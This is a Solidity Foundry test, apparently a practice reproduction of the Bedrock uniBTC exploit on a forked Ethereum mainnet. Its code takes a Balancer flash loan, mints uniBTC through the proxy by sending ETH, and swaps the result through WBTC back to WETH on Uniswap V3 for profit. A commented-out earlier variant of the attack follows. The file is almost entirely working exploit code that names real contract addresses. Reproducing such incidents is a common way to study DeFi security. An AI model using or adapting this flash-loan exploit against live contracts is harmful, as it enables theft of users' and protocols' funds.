// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;
import  "forge-std/Test.sol";
import "./interface.sol";
//cast interface --etherscan-api-key xxx -c mantle  0xe53a90efd263363993a3b41aa29f7dabde1a932d

//模仿 https://learnblockchain.cn/article/9478 , 我只是在練習

contract bedrockAttack is Test {
    // setup, cite: https://app.blocksec.com/explorer/tx/eth/0x725f0d65340c859e0f64e72ca8260220c526c3e0ccde530004160809f6177940?line=54
    address balancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address payable weth = payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address uniBTC = 0x004E9C3EF86bc1ca1f0bB5C7662861Ee93350568;
    address wbtc = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address payable uniswapV3Router = payable(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    address uniBTCProxy = 0x047D41F2544B7F63A8e991aF2068a363d210d6Da;  //0x047d_TransparentUpgradeableProxy

    function setUp() external {
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/***", 20836584 - 1);
        deal(address(this), 1e18);
    }

    function testAttack() external{
        console.log("Before attack: ETH balance = ", address(this).balance / (10**18));

        // approve
        IERC20(wbtc).approve(uniswapV3Router, type(uint256).max);
        IERC20(uniBTC).approve(uniswapV3Router, type(uint256).max);
        
        // 準備 tokens 陣列和 amounts 陣列
        address[] memory tokens = new address[](1);
        tokens[0] = weth;  // 或者直接用 weth 作為地址
        
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 30800000000000000000;        
        // 30800000000000000000
        iBalancerVault(payable(balancerVault)).flashLoan(address(this), tokens,  amounts, ""); //觸發receiveFlashLoan
        uint256 wETHBalance = WETH9(weth).balanceOf(address(this));
        WETH9(weth).withdraw(wETHBalance);
        console.log("After attack: ETH balance = ", address(this).balance / (10**18));
    }


    // recipient.receiveFlashLoan(tokens, amounts, feeAmounts, userData);
    function receiveFlashLoan(address[] memory tokens, uint256[] memory amounts, uint256[] memory feeAmounts, bytes memory userData) external {
        uint256 wETHBalance = WETH9(weth).balanceOf(address(this));
        WETH9(weth).withdraw(wETHBalance);
        bedrockInterface(uniBTCProxy).mint{value: wETHBalance}();
        ISwapRouter.ExactInputSingleParams memory params1 = ISwapRouter.ExactInputSingleParams(uniBTC, wbtc, 500, address(this), block.timestamp, wETHBalance, 0, 0);
        SwapRouter(uniswapV3Router).exactInputSingle(params1);
        uint256 wBTCBalance = IERC20(wbtc).balanceOf(address(this));
        ISwapRouter.ExactInputSingleParams memory params2 = ISwapRouter.ExactInputSingleParams(wbtc, weth, 500, address(this), block.timestamp, wBTCBalance, 0, 0);
        SwapRouter(uniswapV3Router).exactInputSingle(params2);
        IERC20(weth).transfer(balancerVault,  amounts[0]);
    }


    fallback() external payable {}
}




    // function testAttack() external{
    //     console.log("Before attack: ETH balance = ", address(this).balance / (10**18));


    //     // approve
    //     IERC20(wbtc).approve(uniswapV3Router, type(uint256).max);
    //     IERC20(uniBTC).approve(uniswapV3Router, type(uint256).max);
    //     IERC20(weth).approve(balancerVault, type(uint256).max);

        
    //     // 準備 tokens 陣列和 amounts 陣列
    //     address[] memory tokens = new address[](1);
    //     tokens[0] = weth;  // 或者直接用 weth 作為地址
        
    //     uint256[] memory amounts = new uint256[](1);
    //     amounts[0] = address(this).balance;        
                

    //     // iBalancerVault(payable(balancerVault)).flashLoan(address(this), tokens,  amounts, ""); //觸發receiveFlashLoan

    //     WETH9(weth).deposit{value: address(this).balance}();
    //     uint256 wETHBalance = WETH9(weth).balanceOf(address(this));
    //     console.log("doing, WETH balance = ", wETHBalance / (10**18));

        
    //     IVault(uniBTCProxy).mint(weth, 1e18);
        
    //     ISwapRouter.ExactInputSingleParams memory params1 = ISwapRouter.ExactInputSingleParams(uniBTC, wbtc, 500, address(this), block.timestamp, wETHBalance, 0, 0);
    //     SwapRouter(uniswapV3Router).exactInputSingle(params1);
    //     uint256 wBTCBalance = IERC20(wbtc).balanceOf(address(this));
    //     ISwapRouter.ExactInputSingleParams memory params2 = ISwapRouter.ExactInputSingleParams(wbtc, weth, 500, address(this), block.timestamp, wBTCBalance, 0, 0);
    //     SwapRouter(uniswapV3Router).exactInputSingle(params2);
    //     IERC20(weth).transfer(balancerVault,  amounts[0]);

    //     WETH9(weth).withdraw(wETHBalance);
    //     console.log("After attack: ETH balance = ", address(this).balance / (10**18));
    // }
